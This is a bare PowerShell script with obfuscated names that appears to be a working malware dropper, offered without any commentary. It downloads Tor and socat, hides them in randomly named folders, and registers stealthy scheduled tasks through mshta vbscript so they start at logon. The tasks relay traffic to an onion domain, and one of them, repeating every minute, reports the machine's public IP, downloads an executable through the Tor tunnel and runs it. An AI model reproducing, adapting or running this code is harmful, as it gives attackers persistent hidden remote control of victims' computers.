$SH_TYPE_SCHEDULED_TASK=1;
$SH_TYPE_TASK_SCHEDULER=2;
$schedulerType=$SH_TYPE_SCHEDULED_TASK;
function Dlku
{
param([string]$zipfile, [string]$destination);
$7z = Join-Path $env:ALLUSERSPROFILE '7za.exe';
if (-NOT (Test-Path $7z)){
Try
{
(New-Object System.Net.WebClient).DownloadFile('https://chocolatey.org/7za.exe',$7z);
}
Catch{}
}
if ($(Try { Test-Path $7z.trim() } Catch { $false })){
Start-Process "$7z" -ArgumentList "x -o`"$destination`" -y `"$zipfile`"" -Wait -NoNewWindow
}
else{
$shell = new-object -com shell.application;
$zip = $shell.NameSpace($zipfile);
foreach($item in $zip.items())
{
$shell.Namespace($destination).copyhere($item);
}
}
}
function Base64ToFile
{
param([string]$file, [string]$string);
$bytes=[System.Convert]::FromBase64String($string);
#set-content -encoding byte $file -value $bytes;
[IO.File]::WriteAllBytes($file, $bytes);
}
function RandomString{
    param([int]$min=5, [int]$max=15);
    return (-join ((48..57)+(65..90)+(97..122) | Get-Random -Count (Get-Random -minimum $min -maximum $max) | % {[char]$_}));
}
function InitScheduller{
    try{
        Import-Module ScheduledTasks -ErrorAction Stop;
        return $SH_TYPE_SCHEDULED_TASK;
    }catch{
        $File=$env:Temp+'\'+(RandomString)+'.zip';
        $Dest=$env:Temp+'\'+(RandomString);
        while (!(JhGj 'https://api.nuget.org/packages/taskscheduler.2.5.23.nupkg' $File)) {}
        if ((Test-Path $Dest) -eq 1){Remove-Item -Force -Recurse $Dest;}mkdir $Dest | Out-Null;
        Dlku $File $Dest;
        Remove-Item -Force $File;
        $TSAssembly=$Dest+'\lib\net20\Microsoft.Win32.TaskScheduler.dll';
        $loadLib = [System.Reflection.Assembly]::LoadFile($TSAssembly);
        return $SH_TYPE_TASK_SCHEDULER;
    }
}
function AddTask
{
param([string]$name, [string]$cmd, [string]$params='',[int]$restart=0,[int]$delay=0,[string]$dir='');
switch ($schedulerType) {
    $SH_TYPE_SCHEDULED_TASK {
        $Action = New-ScheduledTaskAction -Execute $cmd;
        if(-Not [String]::IsNullOrEmpty($params)){
            $Action.Arguments=$params;
        }
        if(-Not [String]::IsNullOrEmpty($dir)){
            $Action.WorkingDirectory=$dir;
        }
        $LogonTrigger = New-ScheduledTaskTrigger -AtLogOn;
        try{
            $LogonTrigger.UserId=$env:username;
        }catch{
            $LogonTrigger.User=$env:username;
        }
        if(-Not $delay -eq 0){
            $LogonTrigger.Delay=New-TimeSpan -Seconds $delay;
        }
        if($restart -eq 1){
            $TimeTrigger = New-ScheduledTaskTrigger -Once -At 12am -RepetitionInterval ([System.TimeSpan]::FromMinutes(1)) -RepetitionDuration ([System.TimeSpan]::FromDays(365 * 20));
        }
        $Settings = New-ScheduledTaskSettingsSet;
        $Settings.DisallowStartIfOnBatteries = $False;
        $Settings.StopIfGoingOnBatteries = $False;
        if($restart -eq 1){
            $Task = Register-ScheduledTask -Action $Action -Trigger $LogonTrigger,$TimeTrigger -Settings $Settings -TaskName $name -Description (RandomString);
        }else{
            $Task = Register-ScheduledTask -Action $Action -Trigger $LogonTrigger -Settings $Settings -TaskName $name -Description (RandomString);
        }
        Start-ScheduledTask -InputObject $Task;
    };
    Default {
        $ts=New-Object Microsoft.Win32.TaskScheduler.TaskService;
        $td=$ts.NewTask();
        $td.RegistrationInfo.Description = (RandomString);
        $td.Settings.DisallowStartIfOnBatteries = $False;
        $td.Settings.StopIfGoingOnBatteries = $False;
        $td.Settings.MultipleInstances = [Microsoft.Win32.TaskScheduler.TaskInstancesPolicy]::IgnoreNew;
        $LogonTrigger = New-Object Microsoft.Win32.TaskScheduler.LogonTrigger;
        $LogonTrigger.StartBoundary=[System.DateTime]::Now;
        $LogonTrigger.UserId=$env:username;
        $LogonTrigger.Delay=[System.TimeSpan]::FromSeconds($delay);
        $td.Triggers.Add($LogonTrigger);
        if($restart -eq 1){
        $TimeTrigger = New-Object Microsoft.Win32.TaskScheduler.TimeTrigger;
        $TimeTrigger.StartBoundary=[System.DateTime]::Now;
        $TimeTrigger.Repetition.Interval=[System.TimeSpan]::FromMinutes(1);
        $TimeTrigger.Repetition.StopAtDurationEnd=$False;
        $td.Triggers.Add($TimeTrigger);
        }
        $tsf="Microsoft.Win32.TaskScheduler";
        $ExecAction=New-Object "$tsf.ExecAction"($cmd,$params,$dir);
        $td.Actions.Add($ExecAction);
        $task=$ts.RootFolder.RegisterTaskDefinition($name, $td);
        $task.Run();
    };
}
}
function JhGj {
    param([string]$pme, [string]$WWHUceuNqljSR);
    $ErrorActionPreference = "Stop";
    Write-Host ("Download {0} to {1}" -f ($pme, $WWHUceuNqljSR));
    try {
        Start-BitsTransfer -Source $pme -Destination $WWHUceuNqljSR;
    }
    catch {
        #Write-Error $_ -ErrorAction Continue;
        try {
            (New-Object System.Net.WebClient).DownloadFile($pme,$WWHUceuNqljSR);
        }
        catch {
            #Write-Error $_ -ErrorAction Continue;
            Start-Process "cmd.exe" -ArgumentList "/b /c bitsadmin /transfer /download /priority HIGH `"$pme`" `"$WWHUceuNqljSR`"" -Wait -WindowStyle Hidden;
        }
    }finally{
        $ErrorActionPreference = "Continue";
    }
    if ( $(Try { Test-Path $WWHUceuNqljSR.trim() } Catch { $false })){
        return $true;
    }
    return $false;
}
function deIPMuztql{
$schedulerType = InitScheduller;
$tf=$env:Temp+'\'+(RandomString)+'.zip';
$DestTP=$env:ALLUSERSPROFILE+'\'+(RandomString);
$TorMirrors=@("https://dist.torproject.org/",
"https://torproject.mirror.metalgamer.eu/dist/",
"https://tor.ybti.net/dist/");
foreach ($mirror in $TorMirrors) {
    $_url=$mirror+'torbrowser/7.0.11/tor-win32-0.3.1.9.zip';
    if((JhGj $_url $tf)){
        break;
    }
}
if ((Test-Path $DestTP) -eq 1){Remove-Item -Force -Recurse $DestTP;}mkdir $DestTP | Out-Null;
Dlku $tf $DestTP;
Remove-Item -Force $tf;
$uRrKPFJeAClRay=$DestTP+'\Tor\';
$sqJ="vbscript:close(CreateObject(`"WScript.Shell`").Run(`"tor.exe`",0,False))";
AddTask (RandomString) 'mshta.exe' $sqJ 0 0 $uRrKPFJeAClRay;
$SFile=$env:Temp+'\'+(RandomString)+'.zip';
while (!(JhGj 'https://github.com/StudioEtrange/socat-windows/archive/1.7.2.1.zip' $SFile)){}
Dlku $SFile $DestTP;
$s_old=$DestTP+'\socat-windows-1.7.2.1\';
$s_new=(RandomString);
Remove-Item -Force $SFile;
Rename-Item -path $s_old -newName $s_new;
$YEaYHaPiPsF=$DestTP+'\'+$s_new+'\';
$s1cmd='socat tcp4-LISTEN:5555,reuseaddr,fork,keepalive,bind=127.0.0.1 SOCKS4A:127.0.0.1:%DOMAIN%:80,socksport=9050';
$s2cmd='socat tcp4-LISTEN:5588,reuseaddr,fork,keepalive,bind=127.0.0.1 SOCKS4A:127.0.0.1:%DOMAIN%:5588,socksport=9050';
$HMtJojiNUO="vbscript:close(CreateObject(`"WScript.Shell`").Run(`"$s1cmd`",0,False))";
$goVGWpoXFKOwAdW="vbscript:close(CreateObject(`"WScript.Shell`").Run(`"$s2cmd`",0,False))";
AddTask (RandomString) 'mshta.exe' $HMtJojiNUO 0 0 $YEaYHaPiPsF;
AddTask (RandomString) 'mshta.exe' $goVGWpoXFKOwAdW 0 0 $YEaYHaPiPsF;
$uefYCDgNP="vbsc"+"ript:close(CreateObject(`"WScript.Shell`").Run(`"powershell.exe `"`"`$F=`$env:Temp+'\\"+(RandomString)+".exe';rm -Force `$F;`$cl=(New-Object Net.WebClient);`$cl.DownloadFile('http://127.0.0.1:5555/"+(RandomString)+".asp?ts&ip='+`$cl.Download`"+`"String('http://api.ipify.org/'),`$F);& `$F`"`"`",0,False))";
AddTask (RandomString) 'mshta.exe' $uefYCDgNP 1;
}
deIPMuztql;
